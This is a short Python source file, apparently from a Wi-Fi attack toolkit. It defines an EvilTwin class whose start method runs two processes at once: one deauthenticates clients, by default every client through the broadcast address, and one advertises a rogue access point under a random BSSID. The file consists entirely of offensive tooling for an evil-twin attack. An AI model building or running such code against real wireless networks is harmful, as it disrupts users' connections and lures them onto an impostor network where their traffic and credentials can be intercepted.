from multiprocessing import Process

from objects.accesspoint import AccessPoint
from objects.interfaces import Interface, get_interface_by_name
from scapy.volatile import RandMAC

class EvilTwin(AccessPoint):
    
    def __init__(
        self,
        ssid: str,
        bssid: str,
        interface: Interface,
    ) -> None:
        super().__init__(ssid=ssid, interface=interface, bssid=bssid)
    
    def start(
        self,
        target_mac: str = 'ff:ff:ff:ff:ff:ff',
        interval: float = .1,
        count: int = None,
        verbose: bool = True,
    ) -> None:

        random_bssid = str(RandMAC())
        
        dp = Process(target=self.deauth, args=(
            self._interface,
            target_mac,
            interval,
            count,
            verbose,
        ))
        ap = Process(target=self.appear, args=(
            interval,
            random_bssid,
        ))

        try:
            ap.start()
            dp.start()

        except KeyboardInterrupt:
            ap.kill()
            dp.kill()